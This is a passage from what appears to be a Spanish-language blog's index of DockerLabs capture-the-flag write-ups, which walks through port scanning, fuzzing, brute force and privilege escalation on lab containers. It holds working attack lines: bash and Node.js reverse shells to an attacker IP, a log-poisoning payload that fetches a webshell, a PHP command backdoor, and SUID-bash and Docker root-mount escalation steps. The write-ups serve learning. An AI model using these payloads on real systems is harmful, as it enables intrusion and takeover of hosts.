1111http://172.17.0.2/wordpress/templates/cassiopeia/error.php?cmd=bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F192.168.0.112%2F1111%20%3C%261%27Movimientos lateralesUna vez dentro realizamos un sudo -l sin respuesta pero buscando sobre los directorio home de los usuarios vemos que podemos leer un fichero.find /home/ -user www-data -type f 2&gt;/dev/nullAl realizar un cat nos indica que esta en base64 , me lo paso a mi maquina.python3 -m http.server 8000Una vez en nuestra maquina podemos realizar las oportunas comprobaciones con file strings etc para ver bien a que nos enfrentamos.Los pasos correctos son los siguiente dado que no se codifico un texto si no un fichero.base64 -d passwd &gt; ficherofile ficherounzip ficherocat pass.txtAhora podemos ir por ssh ni bien no logeamos ejecutamos sudo -l y nos indica que podemos usar un script como ignacio.Ejecutamos el script y vemos que es lo que hace.Observamos que el script ejecuta un ls sobre ciertos directorios y en la segunda ejecucion no encuentra el fichero, nos desplazamos a la ruta de la segunda ejecucion y creamos el fcichero que falta.Creo un script de bash para mover /bin/bash y le asigno suid posteriomente lo ejecuto para ser ignacio.Con ignacio tenemos que conseguir escapar del euid y convertinos en usuario real ignacio.Ejecutamos las siguentes ordenes , nos vamos al home de ignacio y creamos a la carpeta .ssh para dentro poner el authorized_keys.ssh-keygen -t rsacat id_rsa.pub    nos copiamos el resultadoecho 'resultado' &gt;&gt; authorized_keysssh -i id_rsa ignacio@172.17.0.2Con eso ya estamos como el user ignacio pudiendo ejecutar todo.Primero y como de costumbre sudo -l.Vemos que nos permiten ejecutar un script en ruby dado que tenemos permisos de escritura sobre ese fichero.#!/usr/bin/env rubyrequire 'fileutils'puts \"Feliz hacking\"FileUtils.cp('/bin/bash', '/tmp')puts \"Aprendamos jugando y compartiendo info\"FileUtils.chmod(\"+s\", \"/tmp/bash\")puts \"Esta ya la tienes :-)\"Yo lo dejo asi a falta de ejecutar bash -p.Nos encntramos la misma situacion de antes , bastaria con copiar el authorized_keys de ignacio al /root/.ssh y entrar por ssh.En fin hasta aqui la otra maquina.Saludos y recuerden seguirme en twitter ,,,, si ya se hoy x."
  },
  
  {
    "title": "DockHackLab , DockerLabs",
    "url": "/posts/dockhacklab/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, upload",
    "date": "2024-07-12 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Reverse shell  nano  bash Scripting  Hacking con dockerHerramientas y recursos  nmap  feroxbuster  Scripting bash  DockerReconocimiento y e...",
    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Reverse shell  nano  bash Scripting  Hacking con dockerHerramientas y recursos  nmap  feroxbuster  Scripting bash  DockerReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX practicas  172.17.0.2reporteComo vemos en el reporte disponemos del http 80 y del ssh 80Vemos la pagima default asi que lanzamos un poco de fuzzing en  busca ficheros y directorios.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -x php,txt,jpg -u http://172.17.0.2Genial nos encuentra una ruta y un fichero que nos dice por donde van los tiros.Vamos a esa ruta y nos encontramos que nos permite subir ficheros probamos con un php y lo sube.Podemos ver que el nombre lo han alterado asi que nos creamos un script que nos cree el diccionario con la permutaciones correspondietes.#!/bin/bash# Función para generar combinaciones y guardar en el archivo de salidagenerate_dictionary() {  #local prefix=\"xxx_\"    # Prefijo fijo  #local suffix=\".php\"    # Sufijo fijo  local word=\"$1\"        # Palabra proporcionada como argumento  local output_file=\"$2\" # Nombre del archivo de salida  # Eliminar el archivo de salida si existe  rm -f \"$output_file\"  # Loop para generar todas las combinaciones  for c1 in {a..z}; do    for c2 in {a..z}; do      for c3 in {a..z}; do        # Construir la línea del diccionario        combination=\"${c1}${c2}${c3}_${word}\"        echo \"$combination\" &gt;&gt;\"$output_file\"      done    done  done  echo \"Diccionario generado en $output_file\"}# Verificar los argumentos proporcionadosif [ $# -ne 2 ]; then  echo \"Uso: $0 &lt;palabra&gt; &lt;archivo_salida&gt;\"  exit 1fi# Llamar a la función para generar el diccionariogenerate_dictionary \"$1\" \"$2\"Una vez tenemos el diccionario resalizamos un fuzzin para que averigue el nombre del archivo.Nos encuentra rapido el fichero que hemos subido.Depende de lo que hayais subido realizareis algun paso mas o menos.Yo subi un revshell directamente asi que a la escucha con nc.Realizamos el tratamiento a la tty.Con la terminal ya funcional realizamos un sudo -l para empezar.Nos han dejado a nano para abusar, os recomiendo la app searchbins anda genial.Como vemos nos han dejado a docker con permisos de root y tambien que esta knockd y podreos hacer por knocking.Debemos buscar la combinacion y sobre el home de usuario vemos un fichero .docker lo revisamos y da un pista sobre bashrc y funciones , asi que miramos bashrc.Ya tenemos la combinacion ahora debemos de llamar.Despues del port knocking si observamos con ps vemos que se a levantado el servicio dockerd y ahora podrmos hacer uso de docker.Aqui nos vamos a aprovechar de que cuando corramos nuestro contenedor lo vamos a corren con permisos uid 0  y de ese modo vamos a montar todo el disco del contenedor principal en nuestra propia maquina de modo que tendremos todo el sistema de ficheros a nuestra disposicion.Para lo cual fealizamos los siguientes pasos.sudo /usr/bin/docker pull alpineNos descargamos la imagen de alpine por su poco peso y luego la hacemos correr consudo  /usr/bin/docker run -v /:/mnt --rm -it alpine shComo vemos hemos montado todo el raiz del afitrion por asi llamarle.Aqui podemos hacer cualquier cosa editar passwd , copiar un bash y añadirle suid , authorized_keys ,….. yo voy por este ultimoLos comando serian los sigentes , primero generamos las claves , luego la copiamos a su lugar en la carpeta del usuario root en este caso y nos aseguramos que se permita el root login y si no se permite lo modificamos.ssh-keygen -t rsacat id_rsa.pubcd /mnt/root/.sshecho 'el_contenid_que_nos_mostro_cat' &gt;&gt; authorized_keysDesde la maquina atacante y en el directorio donde cremaos las claves nos conectamos por ssh.ssh -i id_rsa root@172.17.0.2Y nos convertimos en root en el contenedor a hackearGracias por leer."
  },
  
  {
    "title": "Rutas , DockerLabs",
    "url": "/posts/rutas/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, Path hijacking, vsftpd",
    "date": "2024-07-11 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Brute Force  Abusar MOTD  RFI  Path hijackingHerramientas y recursos  nmap  feroxbuster  john the ripper  Scripting bashReconocimiento y en...",
    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Brute Force  Abusar MOTD  RFI  Path hijackingHerramientas y recursos  nmap  feroxbuster  john the ripper  Scripting bashReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX practicas  172.17.0.2reporteEn este caso nos detecta el puerto 21 ftp abierto con login anonimo y ya nos muestra los archivos que dispone el servidor ,el 80 http abierto y por ultimo el shh 22 como siempre empezamos por lo menos invasivo que seria revisar la y el codigo fuente por si hay comentarios interesantes.Vemos la pagima default asi que lanzamos un poco de fuzzing en  busca ficheros y directorios.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -x php,txt,jpg -u http://172.17.0.2Nos encuentra un index php asi que volvemos a revisarlo.Revisando el codigo observamos que en los enlaces nos ofrecen varios dominios el que nos interesa es el del medio.Asi que lo agregamos al fichero hosts.Con el dominio asignado procedemos de nuevo a revisar esa nueva ruta.Vemos que es una configuracion de apache que nos pide user y pass, por el 80 llegamos hasta aqui sin ser invasivos , es momento de usar el ftp.Hacemos login con ftp y descargamos los dos ficheros el hola no contiene nada y el zip esta protegido por contraseña.Procedemos a crackearlozip2john respeta.zip &gt; hashzip john --format=PKZIP -w /home/quino/rockyou.txt hashzipLe hacemos un unzip con la password que nos dio john.El txt nos da un nombre de imagen y una url para buscarla.Cuando vamos a la url vemos que es una web distintos writeups , posicionandonos encima de cualquier imagen vemos donde se guardan las imagenes , asi que solo tenemos que completar la url con el nombre de la imagen que nos proporcionaron en este caso crakpass.jpgComprobamos la imagen algo esconde.Hacemos uso de steghide y vemos que contiene un fichero zip al extraer el zip nos pide salvoconducto que no tiene y el zip nos tira el fichero pass que contiene las credenciales para poder entrar a la web alojada en el dominio.Asi que accedemos a ver que nos esconden.Vuelve a ser la pagina por defecto tratemos de hacer fuzzing para buscar mas fondo y para ello hemos de saber que pasa con este tipo de autentificacion .Yo mismo no consegui encontrar info acerca de como poder hacer fuzzing con los programas habituales , si que os puedo decir que capturando la peticion con burpsuite, tanto el pass como el user van en base64.Despues de buscar como poder fuzear con ffuf un buen rato con comandos que no me aportaron mucho decido crear un par de scripts que realicen ese trabajo(para los habituales de si es necesario saber programar para red team , la respuesta es clara SI y yo he de aprender tambien).Mis scriptsObvio que con un poco de ayuda de la penosa gemini dado que chatgpt me tiene limitado el numero prompts.Este primer script me sirve para buscar el parametro del posible LFI.#!/bin/bash# Verificar que se proporcione un argumento (archivo de palabras)if [ $# -eq 0 ]; then  echo \"Uso: $0 &lt;archivo_de_palabras&gt;\"  exit 1fi# Archivo de palabras proporcionado por el usuariowordlist=\"$1\"# Verificar que el archivo de palabras existe y es legibleif [ ! -f \"$wordlist\" ]; then  echo \"El archivo '$wordlist' no existe o no es legible.\"  exit 1fi# Pedir al usuario las extensiones a probarecho \"Ingrese las extensiones separadas por espacios:\"read -r extensions# Función para realizar la solicitud HTTP con curlmake_request() {  local url=\"$1\"  local response=$(curl -s -o /dev/null -w \"%{http_code}\" -X GET \"$url\" -H \"Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==\")  if [ \"$response\" -eq 200 ]; then    echo \"URL exitosa: $url\"  fi}# Ciclo principal para recorrer cada palabra del archivowhile IFS= read -r word; do  # Iterar sobre cada extensión proporcionada por el usuario  for ext in $extensions; do    url=\"http://trackedvuln.dl/${word}.${ext}\"    make_request \"$url\"  donedone &lt;\"$wordlist\"echo \"¡Finalizado!\"Como vemos nos encuentra el fichero index.php que no veiamos ahora podemos volver al navegador y darle un vistazo.Con unas pruebas en la web podemos ver que nos faltaria un parametro y para ello otro script.#!/bin/bash# Verificar que se proporcione un argumento (archivo de palabras)if [ $# -eq 0 ]; then  echo \"Uso: $0 &lt;archivo_de_palabras&gt;\"  exit 1fi# Archivo de palabras proporcionado por el usuariowordlist=\"$1\"# Verificar que el archivo de palabras existe y es legibleif [ ! -f \"$wordlist\" ]; then  echo \"El archivo '$wordlist' no existe o no es legible.\"  exit 1fi# Pedir al usuario las extensiones a probarecho \"Ingrese las rutas de prueba de LFI separadas por espacios:\"read -r extensions# Encabezado de autorización para la autenticación básicaauth_header=\"Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==\"# Función para realizar la solicitud HTTP con curl y contar palabrasmake_request() {  local url=\"$1\"  local response=$(curl -s -H \"$auth_header\" \"$url\")  local num_words=$(echo \"$response\" | wc -w)  if [ \"$num_words\" -ge 87 ]; then  # Mostrar solo si tiene 87 palabras o más    echo \"URL exitosa: $url\"    echo \"Número total de palabras en la respuesta: $num_words\"    #echo \"Contenido de la respuesta:\"    #echo \"$response\"    echo \"---\"  fi}# Ciclo principal para recorrer cada palabra del archivowhile IFS= read -r word; do  # Iterar sobre cada extensión proporcionada por el usuario  for ext in $extensions; do    url=\"http://trackedvuln.dl/index.php?${word}=${ext}\"    make_request \"$url\"  donedone &lt;\"$wordlist\"echo \"¡Finalizado!\"Es similar al anterior pero con ligeras modificaciones.Ahora si vamos a la web a realizar las pruebas.Encontramos que es valido para realizar algun ataque asi que si LFI no es probaremos con RFI.Infiltracion y movimientos laterales.Nos preparamos todo para intentar el RFI.Tenemos exito se trata de un RFI. Una vez conectados vemos que hay dos usuarios norberto y maria , con la shell spawneada  relizamos un sudo -lPath hijackingComo vemos podemos ejecutar baner el cual hace uso de el comando head y si nos fijamos bien casi nos dice lo que hay que hacer.Nos desplazamos a /tmp que es donde el path de sudo nos va a leer el fichero que vamos a crear , dentro de tmp creamos un fichero con el nombre head y le damos permisos de ejecucion.Una vez como norberto vemos que podemos realizar y encontramos un ficero de nombre .miscredenciales en el que nos dan alguna pista.Despues de descifrar el pass que esta en braile probamos el pass en todos los lugares en los que se pueda utilizar exito con ssh.Vemos que estamos limitados en una especie de prision con permisos euid lo que limita nuestro movimiento.Escapa de euidEscapemos de ella para ello voy a crear un authorized_keys para poder usar todo el potencial de bash.ssh-keygen -t rsaUna vez creadas nos copiamos la clave publica al directorio de .ssh de maria.echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwVUOX+NRg34q3JoWFGHWSSmeoJgveaKbbAIiLtLyCwbm2i2YhIPsU+8qqF7ML0knzE9UgTIAuJ/KSZYHKtsJ/ORitVivVgvBjPEflovDjLwwKrg0aSNbKri9bTutc1JNwRpUIK4B6934NaIv1xUg5zJXKeD4ZcRAO2wyiEtT2JcjeTdQnn2sENX2xlhkpbQMEcP8HlpNy2JOIeM01euDQ07aW0WO/xCL1LtAjdTv9vsbAksmXd4MAtDbKVP/+E5CMT3QWJxKn1scV2Pc2Pw4Ar4KuboUnEGD6BXbxtPyOF2JrMH4MTsyULTIdL5VvbjWPIbvq1g8aT8dEYuY5+5TP9gE97Pdwl15+CH/OQbSUDJAKV54K2mX53ab/OVbCFo0k1ZLFwlkNN1kDxIiml1HZxLOqEZuIxPrtRVA23ukq+Na4eKhTxIvFid8rvOCzKfD88O4o+ehRtMFuSMTHCsV4F+uSm1sleyiL5iJeta0JSLjaj/GMR/sog0o0zleoHoc= quino@libero' &gt;&gt; authorized_keysEstamos listos para realizar login como dios manda estando situados en el directorio donde creamos las claves lanzamos el ssh.ssh -i id_rsa maria@172.17.0.2En el directorio maria encontramos un fichero .mipass que nos da la pista.Asi que hacemos una busquedafind / -user maria -perm /u=w Vamos a ver que le ponemos al fichero 00-header.echo \"cp /bin/bash /home/maria/bash &amp;&amp; chmod u+s /home/maria/bash\" &gt;&gt; /etc/update-motd.d/00-headerUna vez modificado el fichero solo nos queda volver a hacer login para que se ejecute lo que hallamos insertado.Ahora en mi caso solo debo hacer un ./bash -p y soy root.Nos encontraremos la misma situacion de antes pueden volver a usar el authorized_keys yo no lo probe con root pero debe fucnionar igual.Hasta aqui la maquinita.Escribanme si saben los comandos de wfuzz , ffuf para fuzzear en directorios restringidos.Saludos.   :-)"
  },
  
  {
    "title": "NodeClimb , DockerLabs",
    "url": "/posts/nodeclimb/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, Cracking",
    "date": "2024-07-05 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Cracking password zip  Re0vshell nodeHerramientas y recursos  nmap  John the ripper  RevshellsReconocimiento y enumeracionLo primero como s...",
    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Cracking password zip  Re0vshell nodeHerramientas y recursos  nmap  John the ripper  RevshellsReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX nodeclimb  172.17.0.2reporteEn este caso nos encontramos solo con el protocolo ftp:port:21 abierto por el ssh:port:22.Lo primero que hacemos es comprobar que nos dejaron en el ftp dado que el login es anónimo según nmap.Como vemos tenemos un zip y en su contenido hay un txt que presumible mente es un password , como solo esa cifrado un cat nos permite ver lo que hay dentro del zip.Pasemos a crakear el fichero como siempre primero lo convertimos  a un hash y así luego john realiza las comprobaciones para averiguar cual es.zip2john secretitopicaron.zip &gt; secretohashjohn --format=PKZIP -w /home/quino/rockyou.txt secretohashInfiltracion y escalada.Una vez con las credenciales intentamos acceder por ssh.Nos encontramos con script.js y si ejecutamos sudo -l , vemos que tenemos permisos con node hacia ese fichero. Asi que nos creamos una revshell con el siguiente código.(function(){    var net = require(\"net\"),        cp = require(\"child_process\"),        sh = cp.spawn(\"sh\", []);    var client = new net.Socket();    client.connect(1111, \"192.168.0.112\", function(){        client.pipe(sh.stdin);        sh.stdout.pipe(client);        sh.stderr.pipe(client);    });    return /a/; // Prevents the Node.js application from crashing})();Nos ponemos a las escucha con nc en nuestra maquina y posteriormente procedemos a ejecutar el script como indica sudo -l.Muchas gracias por leer"
  },
  
  {
    "title": "Master , DockerLabs",
    "url": "/posts/master/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, wordpress, bash command inyection",
    "date": "2024-07-02 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Busqueda de vulnerabilidad en wordpress  wp-automatic 3.92 ultima vulnerable  Inyeccion de comandos a script de bashHerramientas y recursos...",
    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Busqueda de vulnerabilidad en wordpress  wp-automatic 3.92 ultima vulnerable  Inyeccion de comandos a script de bashHerramientas y recursos  nmap  sudoReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX master 172.17.0.2reporteEn este caso nos encontramos solo con el protocolo http abierto por el 80 y lo que aparentemenmte es un wordpress no aparenta ser vulnerable y herramientas como wpscan no reportan nada.No obstante hay un bug en un pluggin que esta usando.Analizamos visualmente y tambien su codigo , visualmete ya nos encontramos que tiene el plugin wp-automatic que se encarga de auto postear , traducir y reescribir contenido desde otros lugare , o  eso creo.En este caso no era listable el contenido y aparte de la pista de arriba tambien podemos encontrarlo de otras fomas leyendo en bruto,  con curl y con grep ……infoYo encontre dos formas de explotarlo una desde burpsuite y la otra un script python como con burp no me llevo bien del todo tiro del script.scriptAl ejecutarlo nos creo un usuario privilegiado en wordpress. asi que vamos a ello.InfiltracionUna vez dentro voy a hacerla corta , me desplaza a add new pluggin e instalo un file manager y lo activamos.Como veis en la imagen de abajo me desplazo al dir uploads y creo un fichero con el contenido de la rev de monkey.Una vez creado solo nos ponemos a la escuha primero y luego ejecutamos desde el navegador.Una vez dentro seremos www-data y necesitamos empezar a movernos lateralmente entre usuarios.Movimientos lateralesCon sudo -l tenemos suerteSi abusamos de php nos convertimos en pylon.Volvemos a ejecutar sudo -l  y a ver que nos dejaron.Nos dejo un script para oder pasar a mario , ejecutemsolo y veamos que hace.Pareciera que es parecido al que la maquina whoiam y hace uso de eq. ASi que trataremos de inyectarle el array con nuestro comando.Ahora como mario a por root encontramos lo mismo pero apuntando al directorio de pylon.  Metodo manual con  burpsuiteMuchas gracias por llegar hasta aqui"
  },
  
  {
    "title": "Los 40 Ladrones , DockerLabs",
    "url": "/posts/los40ladrones/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, Port knocking",
    "date": "2024-07-01 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Brute Force  Port knockingHerramientas y recursos  nmap  feroxbuster  knockingReconocimiento y enumeracionLo primero como siempre le tiramo...",
    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Brute Force  Port knockingHerramientas y recursos  nmap  feroxbuster  knockingReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX losladrones  172.18.0.2reporteEn este caso y con el comando habitual solo detecta el puerto 80 http abierto,  así que procedemos a revisar la web pese a lo que aparenta.Lanzamos un poco de fuzzingferoxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -u http://172.17.0.2 No encuentra ningún directorio pasamos a buscar ficheros.Busquemos ficheros.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -x php,txt,jpg -u http://172.17.0.2Con la búsqueda de ficheros hemos tenido mas éxito y no encentra un txt , miremos lo para ver que tenemos.Como vemos tenemos un posible usuario toctoc y si tiene trastorno obsesivo compulsivo pues se volvió loco buscando como entrar.Es obvio que algo se nos paso si  nos están dando un usuario y lo que parecen ser puertos , deberemos de localizar donde esta ssh y en que estado esta el puerto.nmap --top-ports 25T -n -Pn 172.17.0.2 Decido ejecutarlo así por si aparte de estar filtrado lo hubiesen también cambiado de puerto cosa no descabellada.En este caso parece estar en el 22.Sin mas lanzamos un golpeteo contra los puertos que indica el fichero qdefense.txtknock 172.17.0.2 7000 8000 9000 -v Como vemos en la imagen después del golpeteo ya figura el estado de abierto y podemos empezar con la fuerza bruta y el usuario toctoc.hydra -l toctoc -P /home/quino/rockyou.txt ssh://172.17.0.2 -t 64 -VI Nos logeamos con el user toctoc y empezamos a buscar como escalar privilegios.Lo primero que ejecuto es sudo -lTenemos suerte revisamos pero algo no cuadra y hay que seguir buscando.Posteriormente encontramos.Viendo esas instrucciones halladas en una funcioncita en bashrc nos trasladamos a la maquina atacante y knocking de nuevo.Retornamos a la victima y buscamos que ha sucedido y ahora tendremos el bash con permisos suid.Escalada finalAsi que …………sudo /opt/bash -pMuchas gracias por leer ayuda y comparte conocimiento."
  },
  
  {
    "title": "Veneno , DockerLabs",
    "url": "/posts/veneno/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, Log poisoning",
    "date": "2024-06-26 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  LFI to RCE  Log poisoning  findHerramientas y recursos  nmap  feroxbuster  wfuzz  exiftoolReconocimiento y enumeracionLo primero como siemp...",
    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  LFI to RCE  Log poisoning  findHerramientas y recursos  nmap  feroxbuster  wfuzz  exiftoolReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX veneno  172.18.0.2reporteEn este caso nos encontramos  con el protocolo ssh abierto en su versión 7.6 y el http por el 80.La web es la de la instalación por defecto y la versión de ssh nos invita a realizar enumeración de usuarios.No obstante prefiero hacer un poco de fuzing pq si no hay nada para que esta corriendo.Buscando directoriosferoxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -u http://172.17.0.2 Busquemos ficheros.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -x php,txt,jpg -u http://172.17.0.2Investigamos el fichero problems.php y vemos que nos devuelve siempre al index.html pongamos lo que pongamos , por tanto esta esperando un parámetro especifico que modifique su acción.Fuzeamos en busca del parámetro.wfuzz -c --hl=363 -t 200 -w /usr/share/dict/wordlist-probable.txt -u \"http://172.17.0.2/problems.php?FUZZ=/etc/passwd\"Una vez obtenido el parámetro podemos tratar de leer ficheros y corroboramos que podemos leer /etc/passwd.Ya tenemos un usuario al alcance , pero en esta maquina no van por ahí los tiros así que buscamos logs que nos ayuden.Log poisoningEncontramos que tenemos el access.log a disposición , tratamos de envenenarlo.Recordemos que teníamos el directorio uploads con permisos, así que tratamos de subir un a webshell , descargamos la que nos guste y no montamos con python un server el cual dejamos a la espera para posterior subir la webshell con la siguiente petición.curl -i -v 172.17.0.2 -A \"&lt;?php system('curl 192.168.0.112:8000/webshell.php -o /var/www/html/uploads/webshell.php'); ?&gt;\"El comando superior nos creara un nuevo registro en el access.log el cual se ejecutara cuando refresquemos la pagina y si todo ha ido bien , solo debemos entrar en /uploads y ejecutar la webshell.IntrusiónUna vez dentro nos encontramos.Hacemos un ls sobre el home para ver usuarios y también sobre el directorio html en el cual encontramos un fichero curioso.Como vemos nos dice que el fichero tiene 24 años y es el mismo desde entonces , osea que debemos buscar un fichero con esa antiguedad.Haremos uso de find indicándole los días que hace que tiene el fichero.find / -type f -mtime +8760 2&gt;/dev/nullLeemos el ficheroTenemos ya un pass imaginemos que es el de carlos.Vamos a sshUna vez logueados con Carlos  revisamos su home y nos encontramos lo siguiente.Esa estructura nos lleva a suponer que hay algo escondido.Ejecutando un ls -laR podemos listar todo y veremos lo que nos interesa.Nos montamos un server con python y descargamos la imagen para analizarla.Le pasamos exiftool y veremos una pass conocida.Muchas gracias por llegar hasta aquí , aprendamos juntos y compartamos el conocimiento sea mucho o poco tu opinión puede aportar siempre.  Si fuzeamos demasiado podemos tener problemas para cargar el access.log , recomiendo en ese caso reiniciar la maquina."
  },
  
  {
    "title": "Mybb , DockerLabs",
    "url": "/posts/mybb/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, mybb, rce",
    "date": "2024-06-26 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Herramientas y recursos  nmap  feroxbusterReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de cost...",
    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Herramientas y recursos  nmap  feroxbusterReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX mybb  172.18.0.2reporteEn este caso nos encontramos solo con el protocolo http abierto por el 80.Posicionandonos arriba del link del forum o clickando sobre el podremos ver el virtual host hemos de añadir a /etc/hosts el virtual host.Despues de añadido podremos acceder al al foro se trata de Mybb pero no podemos encontrar la version ni nada por el estilo.De momento lo unico que tenemos es el usario admin que puede verse claramente, asi que haremos fuerza bruta bruta.Primero hagamos un poco de fuzzing por si esconde algo mas.Encontramos el directorio backups el cual tiene un fichero llamado data.Lo leemos y extraemos un pass hasheado y un nombre de usuario pero de momento no tenemos por donde usar esos datos.Pasamos el hash a un fichero aparte y tiramos con john para que nos diga la contraseña.../../../../../quino/hacking_tools/brute_passwords_hash/john/run/john hash --showEn el panel de la web dice solo un mienbro registrado es decir alice no sirve , debemos hacer fuerza si o si contra admin.Despues de probar varias herramientas para tal proposito , todas me devolvian falsos positivos , mismo peso de la pagina , mismo numero de lineas etc , etc ,etc , para solucionar eso imagino que wireshark seria un buen aliado para ver bien que esta ocurriendo aunque en otro login http la solucion fue ffuf en este daba igual. Tampoco importaba si lo tiraba contra menbers.php o /admin/index.php .De momento tiro de hydra.hydra -l admin -P /home/quino/test panel.mybb.dl http-post-form \"/member.php:username=admin&amp;password=^PASS^&amp;remember=yes&amp;submit=Login&amp;action=do_login&amp;url=&amp;my_post_key=8bf80030fa0d699af33e313cdf8b5840:Please correct the following errors before continuing\"Aqui viendo que esto ya me ocurrio otra vez y pensando que pasaria si en vez de 15 falsos positivos fuesen 50 busque una solucion con un poco de scripting en bash para corroborar esos logins.Primero filtro con awk para que solo me muestre la columna de los pass y asi los copio a un txt.Una vez con la lista de posibles passwords y el nombre de usuario  creamos un bash script para que realice el las pruebas.Obetemos babygirl , no obstante tambien hay algo que bloquea los inicios de sesion si tiras mas de 5 intentos, no entiendo pq con hydra para despues de 15 intentos y en cambio ffuf sigue tirando falsos positivos hasta el final del diccionario.DEBE BLOQUEAR POR X INTENTOS EN LA MISMA IP EN X TIEMPOEstoy presuponiendo que tanto hydra con ffuf deben de engañar de algun modo a mybb.Cuando consiga que el script no bloquee el foro lo subire a mi github.InfiltracionHacemos login en el foro con las credenciales obtenidas y buscamos la version para encontrar exploits.SALTEN ESTO 3 HORAS PERDIDAS POR NO LEER LA VERSION BIEN CREI HABER LEIDO 1.8.32 CUANDO ES 1.8.35Con esa version encuentro en github una manera que es a traves de la union de un png con un backdoor en php basico.&lt;?phpif(isset($_REQUEST['cmd'])){        echo \"&lt;getshell success&gt;\";        $cmd = ($_REQUEST['cmd']);        system($cmd);        echo \"&lt;getshell success&gt;\";        phpinfo();}?&gt;Una vez tenemos el png y el backdoor.php creados los fusionamos.cat backdoor.php &gt;&gt; backdoor.pngComprobamos que file nos da la info correcta.HASTA AQUI LA PERDIDA DE TIEMPOP.D: aprendimos a meter payload en png :-)  …..Realizo de nuevo busqueda en san google y encuentro info acerca de este cms en vuldb con un cve asociado CVE-2023-41362.Encontramos un exploit en github mucho mas sencillo de lo que tenia antes.python3 xploit.py http://panel.mybb.dl admin babygirlYa tenemos un rce.Podemos enviarnos una rev para mayor comodidad que ya esta bien de sufrir.Le realizamos el corespondiente tratamiento.Ejecuto tanto sudo como find sin exito y recorde que sacamos la pass de un fichero que estaba via web.Una vez como alice vemos un directorio vacio, pero al realizar un sudo vemos que nos permite la ejecucion de scripts ruby como root.Aqui cada uno hara lo que crea conveniente."
  },
  
  {
    "title": "Obsession , DockerLabs",
    "url": "/posts/obssesion/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-06-25 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs practicamos.  Un poco de nmap  Acceso ftp  Hydra  Escalada vimHerramientas y recursos  nmap  HydraReconocimiento y enumeracionLo primero como siempre le tiramos un nmap c...",
    "content": "En este reto de DockerLabs practicamos.  Un poco de nmap  Acceso ftp  Hydra  Escalada vimHerramientas y recursos  nmap  HydraReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX obsession 172.17.0.2reporteComo vemos en el reporte disponemos de tres puertos abiertos uno con el 21 FTP el 22 SSH y el 80 http con apache.Como vemos en el reporte el ftp permite login anónimo así que vamos a ver que hay.Como vemos hay dos archivos , los descargamos y revisamos.get chat-gonza.txtget pendientes.txtComo vemos en el primer fichero tenemos dos posibles usuarios así que lanzamos HYDRA mientras revisamos la web por si hay algo mas.Como observamos tanto en la web como en el chat del ftp parece que el user principal es russoski.hydra -l russoski -P /home/quino/rockyou.txt ssh://172.17.0.2InfiltracionNos logueamos y ya nos dijo que habían permiso incorrectos.Como no recuerdo miro como ejecutar vim para escalar privilegios con searchbins.Hasta aquí la maquinita.Gracias por leer"
  },
  
  {
    "title": "ChocolateFire, DockerLabs",
    "url": "/posts/chocolatefire/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, Openfire cms",
    "date": "2024-06-25 00:00:00 -0300",
    





    
